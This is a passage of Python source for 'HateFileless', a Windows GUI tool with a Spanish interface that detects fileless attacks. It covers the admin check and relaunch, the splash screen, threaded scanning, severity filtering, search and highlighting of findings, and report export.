def is_admin() -> bool:
    try:    return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except: return False

def relaunch_as_admin() -> bool:
    try:
        exe = sys.executable
        params = f'"{os.path.abspath(sys.argv[0])}"' if not getattr(sys,'frozen',False) else ''
        return ctypes.windll.shell32.ShellExecuteW(None,'runas',exe,params,None,1) > 32
    except: return False

# ═══════════════════════════════════════════════════════════════════
#  prep_finding — añade campos internos para la UI
# ═══════════════════════════════════════════════════════════════════
def prep_finding(f: dict, uid: int) -> dict:
    f['_uid']  = uid
    f['_src']  = f['source'].split('(')[0].strip()[:30]
    f['_hits'] = ', '.join(dict.fromkeys(h[0] for h in f['hits']))[:90]
    f['_blob'] = ' '.join((f['source'], f['time'], f['path'],
                           f['_hits'], f['content'][:20000])).lower()
    return f

def build_highlighter(hits):
    lits, rxs = [], []
    for name, _ in hits:
        if name in PS_SIGNATURES:
            lits += PS_SIGNATURES[name]['kw']
    parts = [re.escape(k) for k in sorted(set(lits), key=len, reverse=True) if k.strip()]
    parts += [p.pattern for cfg in OBF_COMPILED.values() for p in cfg['patterns']]
    if not parts: return None
    try:    return re.compile('|'.join(f'(?:{p})' for p in parts[:120]), re.I)
    except: return None

# ═══════════════════════════════════════════════════════════════════
#  SPLASH
# ═══════════════════════════════════════════════════════════════════
class Splash(tk.Toplevel):
    DUR   = 1.1
    STEPS = ['Cargando firmas…', 'Compilando patrones…', 'Preparando escáneres…', 'Listo']

    def __init__(self, parent, on_done):
        super().__init__(parent)
        self.on_done = on_done
        s  = max(self.winfo_fpixels('1i') / 96, 1.0)
        S  = lambda v: int(v * s)
        self.W, self.H = S(440), S(300)
        self.overrideredirect(True)
        self.attributes('-topmost', True)
        self.configure(bg=C['border'])
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        self.geometry(f'{self.W}x{self.H}+{(sw-self.W)//2}+{(sh-self.H)//2}')

        inner = tk.Frame(self, bg=C['bg'])
        inner.pack(fill='both', expand=True, padx=1, pady=1)

        self.cv = tk.Canvas(inner, width=S(150), height=S(150),
                            bg=C['bg'], highlightthickness=0)
        self.cv.pack(pady=(S(26), S(4)))
        cx = cy = S(75)
        r1, r2 = S(56), S(40)
        self.cx, self.cy, self.r1, self.r2 = cx, cy, r1, r2
        self.a1  = self.cv.create_arc(cx-r1, cy-r1, cx+r1, cy+r1,
                                       start=0, extent=250, style='arc',
                                       outline=C['acc'], width=S(4))
        self.dot = self.cv.create_oval(0, 0, 0, 0, fill='#8fc1ff', outline='')
        self.a2  = self.cv.create_arc(cx-r2, cy-r2, cx+r2, cy+r2,
                                       start=0, extent=110, style='arc',
                                       outline='#6fb0ff', width=S(2))
        self.cv.create_text(cx, cy, text='◈', font=(FONT, 26, 'bold'), fill=C['acc'])

        tk.Label(inner, text='HateFileless', font=(FONT, 18, 'bold'),
                 bg=C['bg'], fg=C['text']).pack()
        tk.Label(inner, text='Fileless Detection Suite', font=(FONT, 9),
                 bg=C['bg'], fg=C['muted']).pack(pady=(2, S(8)))
        self.lbl = tk.Label(inner, text='', font=(MONO, 9), bg=C['bg'], fg=C['acc'])
        self.lbl.pack()
        bw, bh = S(240), max(S(4), 3)
        self.bar  = tk.Canvas(inner, width=bw, height=bh, bg=C['card2'], highlightthickness=0)
        self.bar.pack(pady=S(10))
        self.fill = self.bar.create_rectangle(0, 0, 0, bh, fill=C['acc'], outline='')
        self.bw   = bw

        self.t0 = time.perf_counter()
        self._tick()

    def _tick(self):
        t = time.perf_counter() - self.t0
        p = min(t / self.DUR, 1.0)
        a = (t * 330) % 360
        self.cv.itemconfigure(self.a1, start=a)
        self.cv.itemconfigure(self.a2, start=(-t * 200) % 360)
        rad  = math.radians(a)
        px   = self.cx + self.r1 * math.cos(rad)
        py   = self.cy - self.r1 * math.sin(rad)
        self.cv.coords(self.dot, px-5, py-5, px+5, py+5)
        self.bar.coords(self.fill, 0, 0, int(self.bw * p), self.bw)
        self.lbl.config(text=self.STEPS[min(int(p * len(self.STEPS)), len(self.STEPS)-1)])
        if p >= 1.0:
            self.destroy(); self.on_done(); return
        self.after(16, self._tick)

# ═══════════════════════════════════════════════════════════════════
#  APP
# ═══════════════════════════════════════════════════════════════════
class App(ctk.CTk if ctk else object):
    CHUNK = 120

    def __init__(self, admin: bool, demo: bool = False):
        super().__init__(fg_color=C['bg'])
        self.attributes('-alpha', 0.0)
        self.admin, self.demo = admin, demo
        self.sc = max(self.winfo_fpixels('1i') / 96, 1.0)

        self.findings: list = []
        self.by_uid:   dict = {}
        self._uid      = 0
        self.q: queue.Queue = queue.Queue()
        self._scanning     = False
        self._scanned_once = False
        self._scan_t0      = 0.0
        self._scan_secs    = 0.0
        self._pending      = 0
        self._errors: list = []
        self._cur = {s: 0 for s in SEV_COL}
        self._tgt = {s: 0 for s in SEV_COL}
        self._counting    = False
        self.sev_filter   = None
        self.cat_filter   = None   # None = todo, 'exec' o 'bypass'
        self.src_filter   = ALL_SRC
        self.sort         = None
        self._gen         = 0
        self._search_job  = None
        self._status_token= 0
        self._shown_uid   = None

        self.title(f'HateFileless v{VERSION}')
        self.geometry('1280x820')
        self.minsize(1020, 660)
        self._style()
        self._build()
        self._show_placeholder()
        self._bind_keys()
        self.after(30, self._poll)
        self.after(60, self._center)

    # ── Estilo ttk ───────────────────────────────────────────────
    def _style(self):
        sc = self.sc
        s  = ttk.Style(self)
        s.theme_use('clam')
        s.layout('Treeview', [('Treeview.treearea', {'sticky': 'nswe'})])
        s.configure('Treeview', background=C['surface'], foreground=C['text'],
                    fieldbackground=C['surface'], borderwidth=0,
                    rowheight=int(32*sc), font=(FONT, 10))
        s.configure('Treeview.Heading', background=C['card2'], foreground=C['muted'],
                    relief='flat', borderwidth=0, padding=(int(10*sc), int(7*sc)),
                    font=(FONT, 9, 'bold'))
        s.map('Treeview.Heading', background=[('active', C['border'])],
              foreground=[('active', C['text'])])
        def fixed(opt):
            return [e for e in s.map('Treeview', query_opt=opt)
                    if e[:2] != ('!disabled', '!selected')]
        s.map('Treeview',
              foreground=fixed('foreground') + [('selected', '#ffffff')],
              background=fixed('background') + [('selected', C['sel'])])

    def _btn(self, master, text, cmd, primary=False, width=130):
        return ctk.CTkButton(
            master, text=text, command=cmd, width=width, height=38, corner_radius=10,
            font=(FONT, 12, 'bold'),
            fg_color=C['acc'] if primary else C['card2'],
            hover_color=C['acc_h'] if primary else C['border'],
            text_color='#ffffff' if primary else C['text'],
            border_width=0 if primary else 1, border_color=C['border'])

    # ── Construcción ─────────────────────────────────────────────
    def _build(self):
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(4, weight=1)

        # Header
        hdr = ctk.CTkFrame(self, fg_color=C['surface'], corner_radius=0, height=78)
        hdr.grid(row=0, column=0, sticky='ew')
        hdr.grid_columnconfigure(1, weight=1)
        ctk.CTkLabel(hdr, text='◈', font=(FONT, 32, 'bold'), text_color=C['acc'],
                     width=60).grid(row=0, column=0, rowspan=2, padx=(14,2), pady=10)
        ctk.CTkLabel(hdr, text='HateFileless', font=(FONT, 21, 'bold'),
                     text_color=C['text'], anchor='w').grid(
            row=0, column=1, sticky='sw', pady=(14,0))
        ctk.CTkLabel(hdr, text=f'v{VERSION}  ·  Detector de ataques fileless',
                     font=(FONT, 11), text_color=C['muted'], anchor='w').grid(
            row=1, column=1, sticky='nw', pady=(0,12))

        right = ctk.CTkFrame(hdr, fg_color='transparent')
        right.grid(row=0, column=2, rowspan=2, padx=16)
        ok = self.admin
        ctk.CTkLabel(right, text='●  Administrador' if ok else '●  Sin admin',
                     font=(FONT, 11, 'bold'), height=28, corner_radius=14,
                     text_color=SEV_COL['LOW'] if ok else SEV_COL['HIGH'],
                     fg_color=C['card']).pack(side='left', padx=(0,14), ipadx=8)
        self.btn_export = self._btn(right, '⭳  Exportar', self.export, width=116)
        self.btn_export.pack(side='left', padx=4)
        self.btn_clear = self._btn(right, 'Limpiar', self.clear, width=90)
        self.btn_clear.pack(side='left', padx=4)
        self.btn_run = self._btn(right, '▶  Escanear', self.run, primary=True, width=140)
        self.btn_run.pack(side='left', padx=(4,0))
        self.btn_export.configure(state='disabled')

        # Aviso sin admin
        if not self.admin:
            bn = ctk.CTkFrame(self, fg_color=C['warn_bg'],
                              border_color=C['warn_bd'], border_width=1, corner_radius=10)
            bn.grid(row=1, column=0, sticky='ew', padx=16, pady=(12,0))
            bn.grid_columnconfigure(0, weight=1)
            ctk.CTkLabel(bn, anchor='w', justify='left', font=(FONT, 12),
                         text_color='#ffd9a0',
                         text='⚠  Sin permisos de administrador: logs de Seguridad, '
                              '4688 y eventos de auditoría pueden estar vacíos.').grid(
                row=0, column=0, sticky='w', padx=14, pady=10)
            ctk.CTkButton(bn, text='Reiniciar como administrador', height=30, corner_radius=8,
                          font=(FONT, 11, 'bold'), fg_color=SEV_COL['HIGH'],
                          hover_color='#e68422', text_color='#1a1204',
                          command=self._relaunch).grid(row=0, column=1, padx=10)

        # Tarjetas de severidad
        row = ctk.CTkFrame(self, fg_color='transparent')
        row.grid(row=2, column=0, sticky='ew', padx=16, pady=(14,0))
        for i in range(4):
            row.grid_columnconfigure(i, weight=1, uniform='cards')
        self.cards, self.card_num = {}, {}
        for i, sev in enumerate(SEV_COL):
            col = SEV_COL[sev]
            cf  = ctk.CTkFrame(row, fg_color=C['card'], corner_radius=14,
                               border_width=1, border_color=C['border'])
            cf.grid(row=0, column=i, sticky='ew',
                    padx=(0 if i==0 else 6, 0 if i==3 else 6))
            ctk.CTkLabel(cf, text='●', text_color=col,
                         font=(FONT, 12)).grid(row=0, column=0, padx=(16,4), pady=(12,0), sticky='w')
            ctk.CTkLabel(cf, text=SEV_ES[sev].upper(), text_color=C['muted'],
                         font=(FONT, 11, 'bold')).grid(row=0, column=1, pady=(12,0), sticky='w')
            num = ctk.CTkLabel(cf, text='0', text_color=col,
                               font=(FONT, 34, 'bold'), anchor='w')
            num.grid(row=1, column=0, columnspan=2, padx=16, pady=(0,10), sticky='w')
            self._bind_click(cf, lambda s=sev: self._toggle_sev(s))
            self.cards[sev], self.card_num[sev] = cf, num

        # Barra de filtros
        tb = ctk.CTkFrame(self, fg_color='transparent')
        tb.grid(row=3, column=0, sticky='ew', padx=16, pady=(14,0))
        tb.grid_columnconfigure(4, weight=1)

        self.search = ctk.CTkEntry(
            tb, width=280, height=36, corner_radius=10,
            placeholder_text='🔎  Buscar…   (Ctrl+F)',
            fg_color=C['card'], border_color=C['border'],
            text_color=C['text'], font=(FONT, 12))
        self.search.grid(row=0, column=0, padx=(0,8))
        self.search.bind('<KeyRelease>', self._on_search_key)

        self.src_menu = ctk.CTkOptionMenu(
            tb, values=[ALL_SRC], command=self._on_src,
            width=180, height=36, corner_radius=10, font=(FONT, 12),
            dropdown_font=(FONT, 12), fg_color=C['card'],
            button_color=C['card2'], button_hover_color=C['border'],
            dropdown_fg_color=C['card'], dropdown_hover_color=C['card2'],
            text_color=C['text'], dropdown_text_color=C['text'])
        self.src_menu.grid(row=0, column=1, padx=(0,8))

        # Filtro por categoría (Ejecución / Bypass)
        self.cat_seg = ctk.CTkSegmentedButton(
            tb, values=list(CAT_MAP), command=self._on_cat, height=36,
            font=(FONT, 11, 'bold'), fg_color=C['card'],
            selected_color='#2a3d5c', selected_hover_color='#334a70',
            unselected_color=C['card'], unselected_hover_color=C['card2'],
            text_color=C['text'])
        self.cat_seg.set('Todo')
        self.cat_seg.grid(row=0, column=2, padx=(0,8))

        # Filtro por severidad
        self.seg = ctk.CTkSegmentedButton(
            tb, values=list(SEG_MAP), command=self._on_seg, height=36,
            font=(FONT, 12, 'bold'), fg_color=C['card'],
            selected_color=C['acc'], selected_hover_color=C['acc_h'],
            unselected_color=C['card'], unselected_hover_color=C['card2'],
            text_color=C['text'])
        self.seg.set('Todos')
        self.seg.grid(row=0, column=3)

        self.lbl_count = ctk.CTkLabel(tb, text='', font=(FONT, 12), text_color=C['muted'])
        self.lbl_count.grid(row=0, column=4, sticky='e')

        # Panel dividido
        self.pane = tk.PanedWindow(self, orient='vertical', bg=C['bg'], bd=0,
                                   sashwidth=int(10*self.sc), sashrelief='flat',
                                   opaqueresize=True)
        self.pane.grid(row=4, column=0, sticky='nsew', padx=16, pady=10)

        top = ctk.CTkFrame(self.pane, fg_color=C['surface'], corner_radius=12,
                           border_width=1, border_color=C['border'], bg_color=C['bg'])
        self.pane.add(top, minsize=int(200*self.sc), stretch='always')
        top.grid_columnconfigure(0, weight=1)
        top.grid_rowconfigure(0, weight=1)

        cols = ('sev', 'time', 'source', 'hits', 'summary')
        self.heads = {'sev': 'Severidad', 'time': 'Tiempo', 'source': 'Fuente',
                      'hits': 'Detecciones', 'summary': 'Vista previa'}
        self.tree = ttk.Treeview(top, columns=cols, show='headings', selectmode='browse')
        widths = {'sev': 112, 'time': 190, 'source': 215, 'hits': 250, 'summary': 600}
        for c in cols:
            self.tree.heading(c, text=self.heads[c], anchor='w',
                              command=lambda c=c: self._sort_by(c))
            self.tree.column(c, width=int(widths[c]*self.sc),
                             minwidth=int(70*self.sc), stretch=(c=='summary'), anchor='w')
        for sev, col in SEV_COL.items():
            self.tree.tag_configure(sev, foreground=col)
        self.tree.tag_configure('odd',  background='#121620')
        self.tree.tag_configure('even', background=C['surface'])
        vsb = ctk.CTkScrollbar(top, orientation='vertical',   command=self.tree.yview,
                               button_color=C['card2'], button_hover_color=C['border'])
        hsb = ctk.CTkScrollbar(top, orientation='horizontal', command=self.tree.xview,
                               button_color=C['card2'], button_hover_color=C['border'])
        self.tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        self.tree.grid(row=0, column=0, sticky='nsew', padx=(4,0), pady=(4,0))
        vsb.grid(row=0, column=1, sticky='ns', pady=4)
        hsb.grid(row=1, column=0, sticky='ew', padx=4)
        self.tree.bind('<<TreeviewSelect>>', self._on_select)
        self.tree.bind('<Button-3>', self._on_right_click)

        self.empty = ctk.CTkLabel(top, text='', font=(FONT, 14), text_color=C['muted'],
                                  justify='center', fg_color=C['surface'])
        self.empty.place(relx=0.5, rely=0.55, anchor='center')

        self.menu = tk.Menu(self, tearoff=0, bg=C['card2'], fg=C['text'], bd=0,
                            activebackground=C['acc'], activeforeground='white', font=(FONT, 10))
        self.menu.add_command(label='Copiar contenido completo', command=lambda: self._copy('content'))
        self.menu.add_command(label='Copiar vista previa',       command=lambda: self._copy('summary'))
        self.menu.add_command(label='Copiar ruta / origen',      command=lambda: self._copy('path'))

        # Detalle
        bot = ctk.CTkFrame(self.pane, fg_color=C['surface'], corner_radius=12,
                           border_width=1, border_color=C['border'], bg_color=C['bg'])
        self.pane.add(bot, minsize=int(170*self.sc), stretch='never')
        bot.grid_columnconfigure(0, weight=1)
        bot.grid_rowconfigure(1, weight=1)

        dh = ctk.CTkFrame(bot, fg_color='transparent')
        dh.grid(row=0, column=0, sticky='ew', padx=12, pady=(10,4))
        dh.grid_columnconfigure(2, weight=1)
        self.chip = ctk.CTkLabel(dh, text='  —  ', font=(FONT, 11, 'bold'),
                                 height=24, corner_radius=6,
                                 fg_color=C['card2'], text_color=C['muted'])
        self.chip.grid(row=0, column=0, padx=(0,10))
        self.lbl_title = ctk.CTkLabel(dh, text='Detalle', font=(FONT, 13, 'bold'),
                                      text_color=C['text'], anchor='w')
        self.lbl_title.grid(row=0, column=1, sticky='w')
        self.lbl_meta = ctk.CTkLabel(dh, text='', font=(MONO, 11),
                                     text_color=C['muted'], anchor='w')
        self.lbl_meta.grid(row=0, column=2, sticky='w', padx=12)
        self.btn_copy = ctk.CTkButton(
            dh, text='Copiar contenido', width=130, height=28, corner_radius=8,
            font=(FONT, 11, 'bold'), fg_color=C['card2'], hover_color=C['border'],
            text_color=C['text'], command=lambda: self._copy('content'))
        self.btn_copy.grid(row=0, column=3)

        self.txt = ctk.CTkTextbox(
            bot, fg_color=C['bg'], text_color=C['text'], corner_radius=8,
            font=(MONO, 12), wrap='word', border_width=0,
            scrollbar_button_color=C['card2'],
            scrollbar_button_hover_color=C['border'])
        self.txt.grid(row=1, column=0, sticky='nsew', padx=10, pady=(0,10))
        t = self.txt._textbox
        t.tag_configure('h',        foreground=C['acc'],           font=(FONT, 10, 'bold'), spacing1=6, spacing3=3)
        t.tag_configure('ex',       foreground=C['muted'],         font=(FONT, 10), lmargin1=22, lmargin2=22)
        t.tag_configure('note',     foreground=C['muted'],         font=(FONT, 10, 'italic'))
        t.tag_configure('fileless', foreground=SEV_COL['CRITICAL'],font=(FONT, 10, 'bold'))
        t.tag_configure('hint',     foreground=C['dim'],           font=(FONT, 12))
        for sev, col in SEV_COL.items():
            t.tag_configure(f'sev_{sev}', foreground=col, font=(FONT, 11, 'bold'))
        t.tag_configure('hit', background='#3b2f10', foreground=SEV_COL['MEDIUM'])

        # Pie
        foot = ctk.CTkFrame(self, fg_color=C['surface'], corner_radius=0)
        foot.grid(row=5, column=0, sticky='ew')
        foot.grid_columnconfigure(0, weight=1)
        self.prog = ctk.CTkProgressBar(foot, height=3, corner_radius=0,
                                       fg_color=C['card2'], progress_color=C['acc'],
                                       indeterminate_speed=1.4)
        self.prog.grid(row=0, column=0, sticky='ew')
        self.prog.set(0)
        self.status = ctk.CTkLabel(foot, text='', font=(FONT, 12),
                                   text_color=C['muted'], anchor='w')
        self.status.grid(row=1, column=0, sticky='ew', padx=16, pady=8)
        self._status('Listo — pulsa ▶ Escanear (F5)')

        self.after(120, lambda: self.pane.sash_place(0, 0, int(self.pane.winfo_height()*0.52)))

    # ── Helpers ──────────────────────────────────────────────────
    def _center(self):
        self.update_idletasks()
        w, h = self.winfo_width(), self.winfo_height()
        x = max((self.winfo_screenwidth()  - w) // 2, 0)
        y = max((self.winfo_screenheight() - h) // 2 - 20, 0)
        tk.Tk.geometry(self, f'+{x}+{y}')

    def reveal(self, a=0.0):
        a = min(a + 0.12, 1.0)
        self.attributes('-alpha', a)
        if a < 1.0:
            self.after(14, lambda: self.reveal(a))
        else:
            self.lift(); self.focus_force()

    def _bind_click(self, w, cb):
        w.bind('<Button-1>', lambda e: cb())
        for ch in w.winfo_children():
            self._bind_click(ch, cb)

    def _bind_keys(self):
        self.bind('<F5>',        lambda e: self.run())
        self.bind('<Control-f>', lambda e: self.search.focus_set())
        self.bind('<Control-e>', lambda e: self.export())
        self.bind('<Escape>',    lambda e: self._reset_filters())

    def _status(self, text: str, color: str = None):
        self._status_token += 1
        self.status.configure(text=text, text_color=color or C['muted'])

    def _toast(self, text: str):
        prev_text = self.status.cget('text')
        prev_col  = self.status.cget('text_color')
        self._status(text, C['acc'])
        tok = self._status_token
        self.after(2200, lambda: self._status_token == tok
                   and self._status(prev_text, prev_col))

    def _relaunch(self):
        if relaunch_as_admin():
            self.destroy()
        else:
            messagebox.showwarning('HateFileless',
                                   'No se pudo reiniciar como administrador.')

    # ── Escaneo ──────────────────────────────────────────────────
    def run(self):
        if self._scanning: return
        self.clear(silent=True)
        self._scanning  = True
        self._scan_t0   = time.perf_counter()
        self._pending   = len(SCANNERS)
        self._errors    = []
        self.btn_run.configure(state='disabled', text='⏳  Escaneando…')
        self.btn_clear.configure(state='disabled')
        self.btn_export.configure(state='disabled')
        self.prog.configure(mode='indeterminate')
        self.prog.start()
        self._status('Escaneando…', C['acc'])
        self._set_empty('Recopilando información del sistema…\nLos resultados aparecerán aquí.')

        if self.demo:
            threading.Thread(target=self._demo_worker, daemon=True).start()
            return
        for name, cat, fn in SCANNERS:
            threading.Thread(target=self._worker, args=(name, cat, fn), daemon=True).start()

    def _worker(self, name, cat, fn):
        try:
            res, err = fn(), None
        except Exception as e:
            res, err = [], str(e)
        # Asegurar que todos los hallazgos tienen su categoría
        for f in res:
            f.setdefault('cat', cat)
        self.q.put(('scan_done', name, res, err))

    def _demo_worker(self):
        items = demo_findings()
        for i, (name, cat, _fn) in enumerate(SCANNERS):
            time.sleep(0.3)
            batch = items[i::len(SCANNERS)]
            for f in batch:
                f.setdefault('cat', cat)
            self.q.put(('scan_done', name, batch, None))

    def _poll(self):
        try:
            while True:
                msg = self.q.get_nowait()
                if msg[0] == 'scan_done':
                    self._on_scan_done(*msg[1:])
        except queue.Empty:
            pass
        self.after(50, self._poll)

    def _on_scan_done(self, name, res, err):
        self._pending -= 1
        done = len(SCANNERS) - self._pending
        if err:
            self._errors.append(f'{name}: {err}')
        for f in res:
            self._uid += 1
            self.by_uid[self._uid] = prep_finding(f, self._uid)
            self.findings.append(f)
        self.findings.sort(key=lambda x: x['time'], reverse=True)
        self.findings.sort(key=lambda x: SEV_ORDER.get(x['severity'], 9))
        for s in SEV_COL:
            self._tgt[s] = sum(1 for f in self.findings if f['severity'] == s)
        self._start_count()
        self._update_sources()
        self._refresh()
        if self._pending > 0:
            # Estado cíclico sin revelar el escáner
            idx = done % len(_STATUS_CYCLE)
            self._status(f'{_STATUS_CYCLE[idx]}  {done} / {len(SCANNERS)}', C['acc'])
        else:
            self._finish()

    def _finish(self):
        self._scanning     = False
        self._scanned_once = True
        self._scan_secs    = time.perf_counter() - self._scan_t0
        self.prog.stop()
        self.prog.configure(mode='determinate')
        self.prog.set(1)
        self.btn_run.configure(state='normal', text='▶  Escanear')
        self.btn_clear.configure(state='normal')
        self.btn_export.configure(state='normal' if self.findings else 'disabled')

        n = len(self.findings)
        c = self._tgt.get('CRITICAL', 0)
        h = self._tgt.get('HIGH', 0)
        b = sum(1 for f in self.findings if f.get('cat') == 'bypass')
        secs = f'{self._scan_secs:.1f}s'

        if n == 0:
            msg, col = f'✓ Completado en {secs} — sin indicios detectados.', SEV_COL['LOW']
        elif c:
            msg, col = (f'⚠ {secs} · {n} hallazgos  ({c} críticos, {h} altos) · '
                        f'{b} intentos de bypass'), SEV_COL['CRITICAL']
        elif b:
            msg, col = (f'⚠ {secs} · {n} hallazgos · {b} intentos de bypass — '
                        f'revisa la sección Bypass'), SEV_COL['HIGH']
        else:
            msg, col = f'{secs} · {n} hallazgos ({h} altos).', SEV_COL['HIGH']
        if self._errors:
            msg += f'  ·  {len(self._errors)} fuentes con error'
        self._status(msg, col)
        self._refresh()

    # ── Contadores animados ──────────────────────────────────────
    def _start_count(self):
        if not self._counting:
            self._counting = True
            self._count_up()

    def _count_up(self):
        busy = False
        for s in SEV_COL:
            cur, tgt = self._cur[s], self._tgt[s]
            if cur != tgt:
                step = max(1, abs(tgt - cur) // 4)
                cur  = min(cur + step, tgt) if cur < tgt else max(cur - step, tgt)
                self._cur[s] = cur
                self.card_num[s].configure(text=str(cur))
                busy = True
        if busy: self.after(30, self._count_up)
        else:    self._counting = False

    # ── Filtros ──────────────────────────────────────────────────
    def _toggle_sev(self, sev):
        self._set_sev(None if self.sev_filter == sev else sev)

    def _on_seg(self, label):  self._set_sev(SEG_MAP[label])
    def _on_src(self, value):  self.src_filter = value; self._refresh()
    def _on_cat(self, label):
        self.cat_filter = CAT_MAP[label]
        self._refresh()

    def _set_sev(self, sev):
        self.sev_filter = sev
        self.seg.set(next(k for k, v in SEG_MAP.items() if v == sev))
        for s, cf in self.cards.items():
            on = (s == sev)
            cf.configure(border_color=SEV_COL[s] if on else C['border'],
                         border_width=2 if on else 1)
        self._refresh()

    def _on_search_key(self, _e=None):
        if self._search_job: self.after_cancel(self._search_job)
        self._search_job = self.after(180, self._refresh)

    def _reset_filters(self):
        self.search.delete(0, 'end')
        self.src_filter = ALL_SRC
        self.src_menu.set(ALL_SRC)
        self.cat_filter = None
        self.cat_seg.set('Todo')
        self.focus_set()
        self._set_sev(None)

    def _update_sources(self):
        srcs = sorted({f['_src'] for f in self.findings})
        self.src_menu.configure(values=[ALL_SRC] + srcs)
        if self.src_filter not in srcs:
            self.src_filter = ALL_SRC
            self.src_menu.set(ALL_SRC)

    def _sort_by(self, col):
        if self.sort and self.sort[0] == col:
            self.sort = (col, not self.sort[1]) if not self.sort[1] else None
        else:
            self.sort = (col, False)
        for c in self.heads:
            arrow = ''
            if self.sort and self.sort[0] == c:
                arrow = '  ▼' if self.sort[1] else '  ▲'
            self.tree.heading(c, text=self.heads[c] + arrow)
        self._refresh()

    def _visible_ids(self):
        q = self.search.get().strip().lower()
        out = []
        for f in self.findings:
            if self.sev_filter and f['severity'] != self.sev_filter: continue
            if self.cat_filter and f.get('cat') != self.cat_filter: continue
            if self.src_filter != ALL_SRC and f['_src'] != self.src_filter: continue
            if q and q not in f['_blob']: continue
            out.append(f)
        if self.sort:
            col, rev = self.sort
            key = {
                'sev':     lambda f: SEV_ORDER.get(f['severity'], 9),
                'time':    lambda f: f['time'],
                'source':  lambda f: f['source'].lower(),
                'hits':    lambda f: f['_hits'].lower(),
                'summary': lambda f: f['summary'].lower(),
            }[col]
            out.sort(key=key, reverse=rev)
        return [f['_uid'] for f in out]

    # ── Tabla ────────────────────────────────────────────────────
    def _set_empty(self, text):
        if text:
            self.empty.configure(text=text)
            self.empty.place(relx=0.5, rely=0.55, anchor='center')
            self.empty.lift()
        else:
            self.empty.place_forget()

    def _refresh(self):
        self._search_job = None
        ids   = self._visible_ids()
        self._gen += 1
        self.tree.delete(*self.tree.get_children())
        total = len(self.findings)
        self.lbl_count.configure(
            text=f'{len(ids)} de {total} resultados' if total else '')
        if ids:
            self._set_empty('')
        elif total:
            self._set_empty('Ningún resultado coincide.\nPulsa Esc para limpiar filtros.')
        elif self._scanning:
            self._set_empty('Recopilando información…\nLos resultados irán apareciendo aquí.')
        elif self._scanned_once:
            self._set_empty('✓  Sin indicios\nNo se detectó actividad fileless ni intentos de bypass.')
        else:
            self._set_empty('Aún no hay resultados\nPulsa  ▶ Escanear  para analizar este equipo.')
        self._fill(ids, 0, self._gen)

    def _fill(self, ids, pos, gen):
        if gen != self._gen: return
        end = min(pos + self.CHUNK, len(ids))
        for k in range(pos, end):
            f   = self.by_uid[ids[k]]
            src = ('⚡ ' if f.get('fileless') else '') + f['source']
            self.tree.insert('', 'end', iid=str(f['_uid']),
                             values=(f'●  {SEV_ES[f["severity"]]}',
                                     f['time'], src, f['_hits'], f['summary']),
                             tags=(f['severity'], 'odd' if k % 2 else 'even'))
        if end < len(ids):
            self.after(1, lambda: self._fill(ids, end, gen))
        elif self._shown_uid is not None and self.tree.exists(str(self._shown_uid)):
            self.tree.selection_set(str(self._shown_uid))

    # ── Detalle ──────────────────────────────────────────────────
    def _show_placeholder(self):
        self._shown_uid = None
        self.chip.configure(text='  —  ', fg_color=C['card2'], text_color=C['muted'])
        self.lbl_title.configure(text='Detalle')
        self.lbl_meta.configure(text='')
        t = self.txt._textbox
        t.configure(state='normal'); t.delete('1.0', 'end')
        t.insert('end', '\n   Selecciona una fila para ver qué se detectó,'
                        ' qué significa y el contenido completo.', 'hint')
        t.configure(state='disabled')

    def _selected(self):
        sel = self.tree.selection()
        if not sel: return None
        return self.by_uid.get(int(sel[0]))

    def _on_select(self, _e=None):
        f = self._selected()
        if not f or f['_uid'] == self._shown_uid: return
        self._show(f)

    def _show(self, f):
        self._shown_uid = f['_uid']
        sev = f['severity']
        col = SEV_COL.get(sev, C['text'])
        cat = f.get('cat', 'exec')
        cat_label = '  BYPASS  ' if cat == 'bypass' else '  EXEC  '
        self.chip.configure(text=f'  {SEV_ES[sev].upper()}  ', fg_color=col, text_color='#0a0c12')
        self.lbl_title.configure(
            text=f['source'] + ('   ⚡ FILELESS' if f.get('fileless') else ''))
        self.lbl_meta.configure(text=f'{f["time"]}   ·   {f["path"]}')

        t = self.txt._textbox
        t.configure(state='normal'); t.delete('1.0', 'end')
        t.insert('end', 'QUÉ SE DETECTÓ\n', 'h')
        seen = set()
        for hn, hs in f['hits']:
            if hn in seen: continue
            seen.add(hn)
            t.insert('end', f'  ●  {SEV_ES[hs]:<8}{hn}\n', f'sev_{hs}')
            if hn in EXPLAIN:
                t.insert('end', EXPLAIN[hn] + '\n', 'ex')
        if f.get('fileless'):
            t.insert('end', '\n⚡ FILELESS — ejecutado en memoria, sin archivo en disco\n', 'fileless')
        t.insert('end', '\nCONTENIDO\n', 'h')
        content = f['content']
        shown   = content[:30000]
        t.mark_set('cs', 'end-1c'); t.mark_gravity('cs', 'left')
        t.insert('end', shown)
        if len(content) > len(shown):
            t.insert('end', f'\n\n… truncado ({len(content):,} chars). '
                            'Usa «Copiar contenido» para el texto completo.', 'note')
        rx = build_highlighter(f['hits'])
        if rx:
            for i, m in enumerate(rx.finditer(shown)):
                if i >= 800: break
                if m.end() != m.start():
                    t.tag_add('hit', f'cs+{m.start()}c', f'cs+{m.end()}c')
        t.configure(state='disabled'); t.yview_moveto(0)

    def _on_right_click(self, e):
        iid = self.tree.identify_row(e.y)
        if iid:
            self.tree.selection_set(iid)
            self.menu.tk_popup(e.x_root, e.y_root)

    def _copy(self, what):
        f = self._selected() or self.by_uid.get(self._shown_uid)
        if not f: return
        self.clipboard_clear(); self.clipboard_append(f[what])
        self._toast('✓ Copiado al portapapeles')

    # ── Limpiar / Exportar ───────────────────────────────────────
    def clear(self, silent=False):
        if self._scanning: return
        self._gen += 1
        self.findings, self.by_uid = [], {}
        self._tgt = {s: 0 for s in SEV_COL}
        self._start_count()
        self._scanned_once = False
        self.tree.delete(*self.tree.get_children())
        self._update_sources()
        self._show_placeholder()
        self.btn_export.configure(state='disabled')
        self.lbl_count.configure(text='')
        self.prog.set(0)
        if not silent:
            self._status('Listo — pulsa ▶ Escanear (F5)')
            self._set_empty('Aún no hay resultados\nPulsa  ▶ Escanear  para analizar este equipo.')

    def export(self):
        if not self.findings: return
        path = filedialog.asksaveasfilename(
            parent=self, title='Exportar informe', defaultextension='.html',
            initialfile=f'HateFileless_{dt.now():%Y%m%d_%H%M%S}',
            filetypes=[('Informe HTML','*.html'),('CSV','*.csv'),('JSON','*.json')])
        if not path: return
        try:
            export_report(path, self.findings, self.admin, self._scan_secs)
